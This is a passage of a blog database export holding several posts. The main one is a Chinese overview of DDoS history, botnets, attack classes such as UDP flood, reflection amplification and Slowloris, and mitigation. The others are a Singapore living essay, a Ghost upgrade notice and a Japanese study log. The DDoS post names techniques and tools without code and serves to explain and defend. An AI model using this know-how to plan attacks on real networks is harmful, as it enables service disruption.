攻击主要有以下几大类：攻击带宽资源、攻击系统资源、攻击应用资源，目前常见的反射攻击，属于攻击带宽。</p>\n<h3 id=\"\">攻击带宽资源</h3>\n<h4 id=\"\">直接攻击</h4>\n<ol>\n<li>\n<p>ICMP/IGMP Flood<br>\n攻击者向目标发送大量 ICMP/IGMP 报文，用来消耗目标的带宽资源，可以使用 hping 等工具发起此类攻击，但被攻击目标可以在网络边界直接过滤此类攻击包，所以目前很少使用，也没什么效果。</p>\n</li>\n<li>\n<p>UDP Flood<br>\n攻击原理与 ICMP 相同，攻击者发送大量 UDP 包来消耗目标的带宽资源。UDP Flood 攻击可以分为小包攻击和大包攻击。小包是 64B，这样可以增大 pps，给对方网络设备增加压力；大包是大于 1500B 的数据包，能有效占用带宽，并且逼迫对方做分片重组运算，拖慢响应。<br>\nUDP Flood 历史悠久，hping，LOIC 等工具可以发动此攻击，对自身的消耗大，对对方的消耗不大。</p>\n</li>\n</ol>\n<h4 id=\"\">反射攻击</h4>\n<p>这种攻击称为 DRDoS，主要特点是利用反射流量对目标进行攻击，并隐藏了攻击来源。如果做个比喻的话，原始的 DDoS 是拿机关枪直接打人，而 DRDoS 则是拿机关枪打墙，利用从墙上反弹回的弹壳伤人。</p>\n<p>在反射攻击中，攻击者将源 IP 伪造成要攻击的目标主机，向反射器发送数据包，而反射器对数据包根据源 IP 进行回复的时候，海量的数据包就发送到了目标主机上，以达到攻击目的。这里面有个关键就是，反射器必须具有放大的作用，即一个较小的请求包，会引发一个较大的回复包，这样攻击者才能以一个较小的请求，反射并放大给目标主机，使目标主机受到攻击，其原理如图所示。</p>\n<p><img src=\"/content/images/2016/01/drdosyuanli.JPG\" alt=\"\"></p>\n<p><strong><em>因为反射攻击中源 IP 地址是伪造的，所以攻击者和被攻击者之间无法进行多次交互，因此发动反射攻击通常使用不需要认证或者握手的协议，即绝大多数反射攻击都是基于 UDP 协议的。</em></strong></p>\n<h3 id=\"\">攻击系统资源</h3>\n<p>攻击系统资源不是通过占用带宽，而是通过促使目标主机的系统资源快速消耗，进而拖慢响应速度。包括：TCP Flood，SYN Flood，PSH + ACK Flood，RST Flood，SockStress，THC SSL DoS，SSL Flood</p>\n<h3 id=\"\">攻击应用资源</h3>\n<p>攻击应用资源包括：DNS Query，DNS NXDOMAIN Flood，HTTP Flood，Slowloris，慢速 POST。</p>\n<p>最终总结如下：</p>\n<p><img src=\"/content/images/2016/01/ddossummary.JPG\" alt=\"\"></p>\n<h2 id=\"ddos\">DDoS 主要攻击工具</h2>\n<p><img src=\"/content/images/2016/01/ddostool.JPG\" alt=\"\"></p>\n<h2 id=\"ddos\">DDoS 的缓解和治理</h2>\n<ol>\n<li>由多方出面，治理僵尸网络，治理反射点。</li>\n<li>CDN 和 Anycast，以及流量稀释和流量清洗。</li>\n</ol>\n<p>文章参考提取自：《破坏之王：DDoS 攻击与防范深度剖析》</p>\n<p>其余有用相关资料：</p>\n<ol>\n<li><a href=\"http://blog.aliyun.com/author/aliyun_blog?spm=0.0.0.0.pQw3zi\">http://blog.aliyun.com/author/aliyun_blog?spm=0.0.0.0.pQw3zi</a></li>\n<li><a href=\"http://blog.nsfocus.net/2015-h1-nsfocus-ddos-threat-report/\">http://blog.nsfocus.net/2015-h1-nsfocus-ddos-threat-report/</a></li>\n</ol>\n</div>","amp":"24","plaintext":"DDoS 的历史\n * 1996 年 9 月 6 日，Panix 遭遇 SYN FLOOD\n * 1996 年 9 月 19 日，CERT 发布“CA-1996-21”，提出缓解 SYN FLOOD 和 IP 欺骗攻击的建议。\n * 1997 年，Trinoo 攻击工具发布，SMURF 源码发布\n * 2000 年，Yahoo 遭遇 DDoS，攻击者是黑手党男孩\n * 2000 年，IETF 发布 RFC 2827，\"Network Ingress Filtering：Defeating Denial of\n   Service Attacks which employ IP Source Address Spoofing\"\n * 2001 年，IRC 服务 EFNet 遭到 3 Gbits/s DDoS 攻击\n * 2002 年，13 台根域名服务器受攻击\n\n......\n\n * 2010 年，Anonymous 宣布开展阿桑奇复仇行动\n * 2011 年，CIA 网站遭到 LulzSec 的 DDoS\n * 2013 年，Spamhaus 受到史上最大规模 DDoS，峰值 300 Gbits/s\n * 2013 年，互联网系统协会宣布在新版 BIND 中增加 RRL 模块用来防范 DDoS\n\nDDoS 的攻击来源\n绝大多数攻击来源于僵尸网络（Botnet），书中主要介绍了僵尸网络的演化。僵尸网络最早可追溯到 IRC 的 Bot 工具 Eggdrop，这是个良性\nBot。这种 Bot 启发了黑客的思路，进而产生了僵尸网络，并一发不可收拾。\n\n根据僵尸网络所依赖的协议，其演进流程从 IRC 到 HTTP 再到 P2P，Zeus 为典型的 HTTP 僵尸网络，主机感染数量庞大的 Zeroaccess 为\nP2P 僵尸网络。\n\nZeus 的泄露对互联网影响深远，目前有黑客为 Zeus 添加了 P2P 模块。另外，目前以互联网中的高性能服务器作为 Bot\n的趋势正在上升，因为受感染的服务器无论在系统资源，在线时间等各方面，都优于传统 PC，移动设备作为僵尸机也是一个趋势。\n\n利用僵尸网络进行 DDoS 的基本原理如图所示。\n\n\n\n最后，Anonymous 组织基于黑客行动主义，采用十分特殊的自愿型僵尸网络，即由大量的人在同一时间，有意识地组成僵尸网络，使用工具对目标进行攻击。\n\nDDoS 的攻击方法\nDDoS 攻击主要有以下几大类：攻击带宽资源、攻击系统资源、攻击应用资源，目前常见的反射攻击，属于攻击带宽。\n\n攻击带宽资源\n直接攻击\n 1. ICMP/IGMP Flood\n    攻击者向目标发送大量 ICMP/IGMP 报文，用来消耗目标的带宽资源，可以使用 hping\n    等工具发起此类攻击，但被攻击目标可以在网络边界直接过滤此类攻击包，所以目前很少使用，也没什么效果。\n    \n    \n 2. UDP Flood\n    攻击原理与 ICMP 相同，攻击者发送大量 UDP 包来消耗目标的带宽资源。UDP Flood 攻击可以分为小包攻击和大包攻击。小包是\n    64B，这样可以增大 pps，给对方网络设备增加压力；大包是大于 1500B 的数据包，能有效占用带宽，并且逼迫对方做分片重组运算，拖慢响应。\n    UDP Flood 历史悠久，hping，LOIC 等工具可以发动此攻击，对自身的消耗大，对对方的消耗不大。\n    \n    \n\n反射攻击\n这种攻击称为 DRDoS，主要特点是利用反射流量对目标进行攻击，并隐藏了攻击来源。如果做个比喻的话，原始的 DDoS 是拿机关枪直接打人，而 DRDoS\n则是拿机关枪打墙，利用从墙上反弹回的弹壳伤人。\n\n在反射攻击中，攻击者将源 IP 伪造成要攻击的目标主机，向反射器发送数据包，而反射器对数据包根据源 IP\n进行回复的时候，海量的数据包就发送到了目标主机上，以达到攻击目的。这里面有个关键就是，反射器必须具有放大的作用，即一个较小的请求包，会引发一个较大的回复包，这样攻击者才能以一个较小的请求，反射并放大给目标主机，使目标主机受到攻击，其原理如图所示。\n\n\n\n因为反射攻击中源 IP 地址是伪造的，所以攻击者和被攻击者之间无法进行多次交互，因此发动反射攻击通常使用不需要认证或者握手的协议，即绝大多数反射攻击都是基于\nUDP 协议的。\n\n攻击系统资源\n攻击系统资源不是通过占用带宽，而是通过促使目标主机的系统资源快速消耗，进而拖慢响应速度。包括：TCP Flood，SYN Flood，PSH + ACK\nFlood，RST Flood，SockStress，THC SSL DoS，SSL Flood\n\n攻击应用资源\n攻击应用资源包括：DNS Query，DNS NXDOMAIN Flood，HTTP Flood，Slowloris，慢速 POST。\n\n最终总结如下：\n\n\n\nDDoS 主要攻击工具\n\n\nDDoS 的缓解和治理\n 1. 由多方出面，治理僵尸网络，治理反射点。\n 2. CDN 和 Anycast，以及流量稀释和流量清洗。\n\n文章参考提取自：《破坏之王：DDoS 攻击与防范深度剖析》\n\n其余有用相关资料：\n\n 1. http://blog.aliyun.com/author/aliyun_blog?spm=0.0.0.0.pQw3zi\n 2. http://blog.nsfocus.net/2015-h1-nsfocus-ddos-threat-report/","feature_image":null,"featured":0,"page":0,"status":"published","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"1","created_at":"2016-01-06T08:27:11.000Z","created_by":"1","updated_at":"2016-01-06T10:47:54.000Z","updated_by":"1","published_at":"2016-01-06T10:47:54.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null},{"id":"59bccd6bf9a5a920fc140c4d","uuid":"4bd9a82e-3853-4c19-b1f8-181f3081d0b2","title":"在新加坡的所见所感（四）","slug":"singapore4","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"![height=\\\"300px\\\" width=\\\"400px\\\"](/content/images/2015/12/beijing.jpg)\\n\\n继续写点杂七杂八的东西。\\n\\n入职的时候，学校给上了一个医保。效果是门诊看病不要钱，大病也能报很多。我做了一个手术，花了一万多人民币，报了 90% 多，自付不到一千块钱。\\n私人诊所的服务很好，全程前台妹子都笑盈盈的，我的卡是新卡，她不清楚报销政策和手续，我也不清楚，结果我没想到的是，她打各种电话打了一个小时，最后弄清了全部手续上的问题，这个真的让我没有想到。\\n手术时特意观察了一下清单，大部分钱都是医生和麻醉师的劳务费，药费和医院各种服务费几乎可以忽略，医生的待遇真的是非常高。\\n\\n平时的日常生活以中文为主，因为好多国内的同胞过去做生意，他们不会说英语，有一次买饭还帮卖饭的小妹充当了一下翻译，而工作中则以英文为主。或者可以说底层生活说华语，上层生活说英语。说的不好听一些，有这样一种感觉，说英语的看不起说粤语、说闽南语的，而说粤语闽南语的则看不起说普通话的。\\n\\nMacbook 的普及率很高，网银和各种官网对 Mac 系统支持的非常好。而且有意思的是，我办的银行卡每月 ATM 取两次钱是免费的，取第三次开始收手续费，似乎是鼓励刷卡消费。\\n\\n每天出门都能看到残疾人和孕妇，我一度很奇怪为啥这里这么多孕妇，这么多坐轮椅的。后来也是想明白了，我们国家应该也很多，只是大家没事都在家里闷着。这里无障碍设施比较到位，所以大家都出来，进而有这种错觉。\\n\\n这里对中国传统的东西有一种不知道该如何形容的态度。有一次我在报纸上看到，《步步惊心》获得了广泛赞誉，好像是获得了什么优秀引进电视剧的奖励，报纸上还说以后要多引进这类好片，能够了解历史文化什么的，记不清楚了。我感觉也是有点哭笑不得。包括中医也好，或者其他的什么也好，东南亚这边推崇的这些，可能在我们看来，连正统的边儿都沾不上，他们却还蛮喜欢的。更奇葩的是，我们在玩命扔掉这些东西，拆拆拆、毁毁毁、废废废。\\n\\n感觉歧视还蛮厉害的，前房东就向我吐槽，孩子上学好贵。新加坡人学费多少多少，PR 的学费多少多少，一下子贵了好多。各种招聘岗位，没有 PR 就几乎免谈了，因为公司雇佣外国人都是有配额的，总之吧，越来越难以留下了。\\n\\n现在回头想想，还是很喜欢这个地方的，优点缺点都很明显的地方，有同学依然在这里工作和奋斗，曾问过他，将来还回国不，他的答案是不知道，因为想留不知何年能真正留下，想走也不知回国如何开始。\"}]],\"sections\":[[10,0]]}","html":"<div class=\"kg-card-markdown\"><p><img src=\"/content/images/2015/12/beijing.jpg\" alt=\"height=&quot;300px&quot; width=&quot;400px&quot;\"></p>\n<p>继续写点杂七杂八的东西。</p>\n<p>入职的时候，学校给上了一个医保。效果是门诊看病不要钱，大病也能报很多。我做了一个手术，花了一万多人民币，报了 90% 多，自付不到一千块钱。<br>\n私人诊所的服务很好，全程前台妹子都笑盈盈的，我的卡是新卡，她不清楚报销政策和手续，我也不清楚，结果我没想到的是，她打各种电话打了一个小时，最后弄清了全部手续上的问题，这个真的让我没有想到。<br>\n手术时特意观察了一下清单，大部分钱都是医生和麻醉师的劳务费，药费和医院各种服务费几乎可以忽略，医生的待遇真的是非常高。</p>\n<p>平时的日常生活以中文为主，因为好多国内的同胞过去做生意，他们不会说英语，有一次买饭还帮卖饭的小妹充当了一下翻译，而工作中则以英文为主。或者可以说底层生活说华语，上层生活说英语。说的不好听一些，有这样一种感觉，说英语的看不起说粤语、说闽南语的，而说粤语闽南语的则看不起说普通话的。</p>\n<p>Macbook 的普及率很高，网银和各种官网对 Mac 系统支持的非常好。而且有意思的是，我办的银行卡每月 ATM 取两次钱是免费的，取第三次开始收手续费，似乎是鼓励刷卡消费。</p>\n<p>每天出门都能看到残疾人和孕妇，我一度很奇怪为啥这里这么多孕妇，这么多坐轮椅的。后来也是想明白了，我们国家应该也很多，只是大家没事都在家里闷着。这里无障碍设施比较到位，所以大家都出来，进而有这种错觉。</p>\n<p>这里对中国传统的东西有一种不知道该如何形容的态度。有一次我在报纸上看到，《步步惊心》获得了广泛赞誉，好像是获得了什么优秀引进电视剧的奖励，报纸上还说以后要多引进这类好片，能够了解历史文化什么的，记不清楚了。我感觉也是有点哭笑不得。包括中医也好，或者其他的什么也好，东南亚这边推崇的这些，可能在我们看来，连正统的边儿都沾不上，他们却还蛮喜欢的。更奇葩的是，我们在玩命扔掉这些东西，拆拆拆、毁毁毁、废废废。</p>\n<p>感觉歧视还蛮厉害的，前房东就向我吐槽，孩子上学好贵。新加坡人学费多少多少，PR 的学费多少多少，一下子贵了好多。各种招聘岗位，没有 PR 就几乎免谈了，因为公司雇佣外国人都是有配额的，总之吧，越来越难以留下了。</p>\n<p>现在回头想想，还是很喜欢这个地方的，优点缺点都很明显的地方，有同学依然在这里工作和奋斗，曾问过他，将来还回国不，他的答案是不知道，因为想留不知何年能真正留下，想走也不知回国如何开始。</p>\n</div>","amp":"25","plaintext":"继续写点杂七杂八的东西。\n\n入职的时候，学校给上了一个医保。效果是门诊看病不要钱，大病也能报很多。我做了一个手术，花了一万多人民币，报了 90% 多，自付不到一千块钱。\n私人诊所的服务很好，全程前台妹子都笑盈盈的，我的卡是新卡，她不清楚报销政策和手续，我也不清楚，结果我没想到的是，她打各种电话打了一个小时，最后弄清了全部手续上的问题，这个真的让我没有想到。\n手术时特意观察了一下清单，大部分钱都是医生和麻醉师的劳务费，药费和医院各种服务费几乎可以忽略，医生的待遇真的是非常高。\n\n平时的日常生活以中文为主，因为好多国内的同胞过去做生意，他们不会说英语，有一次买饭还帮卖饭的小妹充当了一下翻译，而工作中则以英文为主。或者可以说底层生活说华语，上层生活说英语。说的不好听一些，有这样一种感觉，说英语的看不起说粤语、说闽南语的，而说粤语闽南语的则看不起说普通话的。\n\nMacbook 的普及率很高，网银和各种官网对 Mac 系统支持的非常好。而且有意思的是，我办的银行卡每月 ATM\n取两次钱是免费的，取第三次开始收手续费，似乎是鼓励刷卡消费。\n\n每天出门都能看到残疾人和孕妇，我一度很奇怪为啥这里这么多孕妇，这么多坐轮椅的。后来也是想明白了，我们国家应该也很多，只是大家没事都在家里闷着。这里无障碍设施比较到位，所以大家都出来，进而有这种错觉。\n\n这里对中国传统的东西有一种不知道该如何形容的态度。有一次我在报纸上看到，《步步惊心》获得了广泛赞誉，好像是获得了什么优秀引进电视剧的奖励，报纸上还说以后要多引进这类好片，能够了解历史文化什么的，记不清楚了。我感觉也是有点哭笑不得。包括中医也好，或者其他的什么也好，东南亚这边推崇的这些，可能在我们看来，连正统的边儿都沾不上，他们却还蛮喜欢的。更奇葩的是，我们在玩命扔掉这些东西，拆拆拆、毁毁毁、废废废。\n\n感觉歧视还蛮厉害的，前房东就向我吐槽，孩子上学好贵。新加坡人学费多少多少，PR 的学费多少多少，一下子贵了好多。各种招聘岗位，没有 PR\n就几乎免谈了，因为公司雇佣外国人都是有配额的，总之吧，越来越难以留下了。\n\n现在回头想想，还是很喜欢这个地方的，优点缺点都很明显的地方，有同学依然在这里工作和奋斗，曾问过他，将来还回国不，他的答案是不知道，因为想留不知何年能真正留下，想走也不知回国如何开始。","feature_image":null,"featured":1,"page":0,"status":"published","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"1","created_at":"2016-04-08T06:39:36.000Z","created_by":"1","updated_at":"2016-11-28T10:37:35.000Z","updated_by":"1","published_at":"2016-04-08T07:12:22.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null},{"id":"59bccd6bf9a5a920fc140c4e","uuid":"d6082718-ef65-4260-985e-cceac7a0899f","title":"You've been upgraded to the latest version of Ghost","slug":"ghost-0-7","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"You've just upgraded to the latest version of Ghost and we've made a few changes that you should probably know about!\\n\\n## Woah, why does everything look different?\\n\\nAfter two years and hundreds of thousands of users, we learned a great deal about what was (and wasn't) working in the old Ghost admin user interface. What you're looking at is Ghost's first major UI refresh, with a strong focus on being more usable and robust all round.\\n\\n![New Design](https://ghost.org/images/zelda.png)\\n\\nThe main navigation menu, previously located at the top of your screen, has now moved over to the left. This makes it way easier to work with on mobile devices, and has the added benefit of providing ample space for upcoming features!\\n\\n## Lost and found: Your old posts\\n\\nFrom talking to many of you we understand that finding old posts in the admin area was a real pain; so we've added a new magical search bar which lets you quickly find posts for editing, without having to scroll endlessly. Take it for a spin!\\n\\n![Search](https://ghost.org/images/search.gif)\\n\\nQuestions? Comments? Send us a tweet [@TryGhost](https://twitter.com/tryghost)\\n\\nOh, and yes – you can safely delete this draft post!\"}]],\"sections\":[[10,0]]}","html":"<div class=\"kg-card-markdown\"><p>You've just upgraded to the latest version of Ghost and we've made a few changes that you should probably know about!</p>\n<h2 id=\"woahwhydoeseverythinglookdifferent\">Woah, why does everything look different?</h2>\n<p>After two years and hundreds of thousands of users, we learned a great deal about what was (and wasn't) working in the old Ghost admin user interface. What you're looking at is Ghost's first major UI refresh, with a strong focus on being more usable and robust all round.</p>\n<p><img src=\"https://ghost.org/images/zelda.png\" alt=\"New Design\"></p>\n<p>The main navigation menu, previously located at the top of your screen, has now moved over to the left. This makes it way easier to work with on mobile devices, and has the added benefit of providing ample space for upcoming features!</p>\n<h2 id=\"lostandfoundyouroldposts\">Lost and found: Your old posts</h2>\n<p>From talking to many of you we understand that finding old posts in the admin area was a real pain; so we've added a new magical search bar which lets you quickly find posts for editing, without having to scroll endlessly. Take it for a spin!</p>\n<p><img src=\"https://ghost.org/images/search.gif\" alt=\"Search\"></p>\n<p>Questions? Comments? Send us a tweet <a href=\"https://twitter.com/tryghost\">@TryGhost</a></p>\n<p>Oh, and yes – you can safely delete this draft post!</p>\n</div>","amp":"26","plaintext":"You've just upgraded to the latest version of Ghost and we've made a few changes\nthat you should probably know about!\n\nWoah, why does everything look different?\nAfter two years and hundreds of thousands of users, we learned a great deal\nabout what was (and wasn't) working in the old Ghost admin user interface. What\nyou're looking at is Ghost's first major UI refresh, with a strong focus on\nbeing more usable and robust all round.\n\n\n\nThe main navigation menu, previously located at the top of your screen, has now\nmoved over to the left. This makes it way easier to work with on mobile devices,\nand has the added benefit of providing ample space for upcoming features!\n\nLost and found: Your old posts\nFrom talking to many of you we understand that finding old posts in the admin\narea was a real pain; so we've added a new magical search bar which lets you\nquickly find posts for editing, without having to scroll endlessly. Take it for\na spin!\n\n\n\nQuestions? Comments? Send us a tweet @TryGhost [https://twitter.com/tryghost]\n\nOh, and yes – you can safely delete this draft post!","feature_image":null,"featured":0,"page":0,"status":"draft","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"1","created_at":"2016-11-27T08:21:22.000Z","created_by":"1","updated_at":"2016-11-27T08:21:22.000Z","updated_by":"1","published_at":"2016-11-27T08:21:22.000Z","published_by":null,"custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null},{"id":"59bccd6bf9a5a920fc140c4f","uuid":"1829128b-fef3-4b6e-84f4-e92979ebb7a1","title":"個人目標（2017上）振り返る","slug":"mubiao2017shang","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"##日本語\\n\\n###単語\\n<table border=\\\"1\\\">\\n<tr>\\n<th>位置</th>\\n<th>単語数量</th>\\n</tr>\\n<tr>\\n<td>みんなの日本語第一課</td>\\n<td>43</td>\\n</tr>\\n<tr>\\n<td>みんなの日本語第二課</td>\\n<td>67</td>\\n</tr>\\n<tr>\\n<td>みんなの日本語第三課</td>\\n<td>57</td>\\n</tr>\\n<tr>\\n<td>みんなの日本語第四課</td>\\n<td>60</td>\\n</tr>\\n<tr>\\n<td>みんなの日本語第五課</td>\\n<td>72</td>\\n</tr>\\n<tr>\\n<td>みんなの日本語第六課</td>\\n<td>87</td>\\n</tr>\\n<tr>\\n<td>みんなの日本語第七課</td>\\n<td>53</td>\\n</tr>\\n<tr>\\n<td>みんなの日本語第八課</td>\\n<td>71</td>\\n</tr>\\n<tr>\\n<td>みんなの日本語第九課</td>\\n<td>73</td>\\n</tr>\\n<tr>\\n<td>みんなの日本語第十課</td>\\n<td>52</td>\\n</tr>\\n<tr>\\n<td>ここまで</td>\\n<td>635</td>\\n</tr>\\n<tr>\\n<td>みんなの日本語第十一課</td>\\n<td>79</td>\\n</tr>\\n<tr>\\n<td>みんなの日本語第十二課</td>\\n<td>51</td>\\n</tr>\\n<tr>\\n<td>みんなの日本語第十三課</td>\\n<td>60</td>\\n</tr>\\n<tr>\\n<td>みんなの日本語第十四課</td>\\n<td>40</td>\\n</tr>\\n<tr>\\n<td>みんなの日本語第十五課</td>\\n<td>43</td>\\n</tr>\\n<tr>\\n<td>みんなの日本語第十六課</td>\\n<td>45</td>\\n</tr>\\n<tr>\\n<td>みんなの日本語第十七課</td>\\n<td>66</td>\\n</tr>\\n<tr>\\n<td>みんなの日本語第十八課</td>\\n<td>44</td>\\n</tr>\\n<tr>\\n<td>みんなの日本語第十九課</td>\\n<td>40</td>\\n</tr>\\n<tr>\\n<td>みんなの日本語第二十課</td>\\n<td>21</td>\\n</tr>\\n<tr>\\n<td>ここまで</td>\\n<td>489 / 1124</td>\\n</tr>\\n<tr>\\n<td>みんなの日本語第二十一課</td>\\n<td>50</td>\\n</tr>\\n<tr>\\n<td>みんなの日本語第二十二課</td>\\n<td>32</td>\\n</tr>\\n<tr>\\n<td>みんなの日本語第二十三課</td>\\n<td>40</td>\\n</tr>\\n<tr>\\n<td>みんなの日本語第二十四課</td>\\n<td>25</td>\\n</tr>\\n<tr>\\n<td>みんなの日本語第二十五課</td>\\n<td>20</td>\\n</tr>\\n<tr>\\n<td>みんなの日本語第二十六課</td>\\n<td>60</td>\\n</tr>\\n<tr>\\n<td>みんなの日本語第二十七課</td>\\n<td>70</td>\\n</tr>\\n<tr>\\n<td>みんなの日本語第二十八課</td>\\n<td>50</td>\\n</tr>\\n<tr>\\n<td>みんなの日本語第二十九課</td>\\n<td>57</td>\\n</tr>\\n<tr>\\n<td>みんなの日本語第三十課</td>\\n<td>53</td>\\n</tr>\\n<tr>\\n<td>ここまで</td>\\n<td>457 / 1581</td>\\n</tr>\\n<tr>\\n<td>みんなの日本語第三十一課</td>\\n<td>76</td>\\n</tr>\\n<tr>\\n<td>みんなの日本語第三十二課</td>\\n<td>70</td>\\n</tr>\\n<tr>\\n<td>みんなの日本語第三十三課</td>\\n<td>60</td>\\n</tr>\\n<tr>\\n<td>みんなの日本語第三十四課</td>\\n<td>91</td>\\n</tr>\\n<tr>\\n<td>みんなの日本語第三十五課</td>\\n<td>55</td>\\n</tr>\\n<tr>\\n<td>みんなの日本語第三十六課</td>\\n<td>60</td>\\n</tr>\\n<tr>\\n<td>みんなの日本語第三十七課</td>\\n<td>66</td>\\n</tr>\\n<tr>\\n<td>みんなの日本語第三十八課</td>\\n<td>44</td>\\n</tr>\\n<tr>\\n<td>みんなの日本語第三十九課</td>\\n<td>55</td>\\n</tr>\\n<tr>\\n<td>みんなの日本語第四十課</td>\\n<td>70</td>\\n</tr>\\n<tr>\\n<td>ここまで</td>\\n<td>647 / 2228</td>\\n</tr>\\n<tr>\\n<td>みんなの日本語第四十一課</td>\\n<td>50</td>\\n</tr>\\n<tr>\\n<td>みんなの日本語第四十二課</td>\\n<td>65</td>\\n</tr>\\n<tr>\\n<td>みんなの日本語第四十三課</td>\\n<td>45</td>\\n</tr>\\n<tr>\\n<td>みんなの日本語第四十四課</td>\\n<td>55</td>\\n</tr>\\n<tr>\\n<td>みんなの日本語第四十五課</td>\\n<td>35</td>\\n</tr>\\n<tr>\\n<td>みんなの日本語第四十六課</td>\\n<td>80</td>\\n</tr>\\n<tr>\\n<td>みんなの日本語第四十七課</td>\\n<td>48</td>\\n</tr>\\n<tr>\\n<td>みんなの日本語第四十八課</td>\\n<td>28</td>\\n</tr>\\n<tr>\\n<td>みんなの日本語第四十九課</td>\\n<td>32</td>\\n</tr>\\n<tr>\\n<td>みんなの日本語第五十課</td>\\n<td>34</td>\\n</tr>\\n<tr>\\n<td>ここまで</td>\\n<td>472 / 2700</td>\\n</tr>\\n</table>\\n###ニュース\\n#### [ニュース_01](http://www3.nhk.or.jp/news/easy/k10010810471000/k10010810471000.html)\\n<blockquote>\\n<p>４月１４日、熊本県でマグニチュード６.５（Ｍ６．５）の地震がありました。熊本県の益城町では、震度７のとても強い揺れがありました。震度７以上の地震は、２０１１年３月の東日本大震災のあと初めてでした。\\n</p>\\n<p>４月１６日には、マグニチュード７．３（Ｍ７．３）のもっと大きな地震がありました。そのあとも熊本県や隣の大分県で地震が続きました。\\n</p>\\n<p>この地震で、熊本県では１２月２０日までに１６０人が亡くなりました。この中の１０４人は、避難したあと体の具合が悪くなったりして亡くなりました。\\n</p>\\n<p>\\n地震で壊れた家は１７万軒以上ありました。県は、家が壊れた人などがしばらく住む家を約４３００軒建てました。田んぼや畑にひびが入って農業ができなくなった人などもいました。有名な城の熊本城でも、建物が壊れました。\\n</p>\\n<p>\\n地震の前のように戻るためには、しなければならないことがたくさんあります。\\n</p>\\n</blockquote>\\n#### [ニュース_02](http://www3.nhk.or.jp/news/easy/k10010822341000/k10010822341000.html)\\n<blockquote>\\n<p>\\nアメリカの映画「スター・ウォーズ」に出た俳優、キャリー・フィッシャーさんが１２月２７日に亡くなりました。６０歳でした。\\n</p>\\n<p>\\nフィッシャーさんは、１９７７年にヒロインのレイア姫になって、とても勇気がある強い女性を演じました。「スター・ウォーズ」は世界中で人気が出て、シリーズになりました。フィッシャーさんは、その２つ目と３つ目の映画にも出ました。それから３２年が過ぎた去年、新しい「スター・ウォーズ」の映画でまたレイア姫になりました。\\n</p>\\n<p>\\n監督のジョージ・ルーカスさんは「フィッシャーさんはとても頭がいい俳優でした。レイア姫を上手に演じました」と話しました。\\n</p>\\n</blockquote>\\n#### [ニュース_03](http://www3.nhk.or.jp/news/easy/k10010820221000/k10010820221000.html)\\n<blockquote>\\n<p>\\n北海道の海では今、「毛ガニ」を取っています。毛ガニなどのかには、正月の準備をする今の季節に買う人が多くなります。\\n</p>\\n<p>\\n北海道の白糠町では１２月２６日の朝、全部で５００ｋｇの毛ガニが取れました。港では、取ってきたかにを大きさで分けました。甲羅の大きさが１０ｃｍ以上の大きい毛ガニは、競りで１ｋｇ９６００円になりました。去年の同じときより１５００円ぐらい高かくなりました。\\n</p>\\n<p>\\n白糠漁協によると、今年は１２月になってから取ってくる毛ガニが少なくなりました。ロシアからの輸入も少なくなったため、いつもの年より値段が高くなっています。白糠町の毛ガニは、日本のいろいろな市場に送っています。\\n</p>\\n</blockquote>\\n#### [ニュース_04](http://www3.nhk.or.jp/news/easy/k10010810711000/k10010810711000.html)\\n<blockquote>\\n<p>\\n１１月８日、アメリカの次の大統領を選ぶ選挙で、共和党のトランプさんが民主党のクリントンさんに勝ちました。トランプさんはビルやホテルなどをたくさん持っていることで有名ですが、今までに政治の仕事をしたことはありません。\\n</p>\\n<p>\\nトランプさんは「アメリカとメキシコの間に壁を作る」とか「法律を守らないでアメリカに来た移民は国に帰らせる」などと言っています。そして、太平洋の周りの国が自由に貿易できるようにする協定のＴＰＰにも入らないと言っています。\\n</p>\\n<p>\\nトランプさんは２０１７年１月２０日にアメリカの大統領になります。アメリカや世界の人たちは、トランプさんが今までに言ったことを本当に行うかどうか注目しています。\\n</p>\\n</blockquote>\\n#### [ニュース_05](http://www3.nhk.or.jp/news/easy/k10010815741000/k10010815741000.html)\\n<blockquote>\\n<p>\\n１月１日、働きながら育児や介護をしている人が仕事を休みやすくするため、法律が変わります。\\n</p>\\n<p>\\n３月、野球の世界大会「ＷＢＣ」が日本と韓国とアメリカであります。\\n</p>\\n<p>\\n４月１日、都市ガスを使う人は自由にガスの会社を選ぶことができるようになります。今までは住んでいる場所で会社が決まっていました。\\n</p>\\n<p>\\n４月１日、ブロックのおもちゃ「レゴ」のテーマパーク「レゴランド」が名古屋にできます。\\n</p>\\n<p>\\n５月、２０１９年に日本で開くラグビーのワールドカップでどのチームとどのチームが試合をするか決まります。\\n</p>\\n<p>\\n８月ごろ、東京にある文化庁が京都のどの場所に移るか決まります。早い場合で２０１９年に移ります。\\n</p>\\n<p>\\n９月、東京の次の２０２４年のオリンピックとパラリンピックをどこで開くか決まります。\\n</p>\\n<p>\\n１１月ごろ、日本人で１２人目の宇宙飛行士の金井宣茂さんが国際宇宙ステーションに行きます。\\n</p>\\n</blockquote>\\n#### 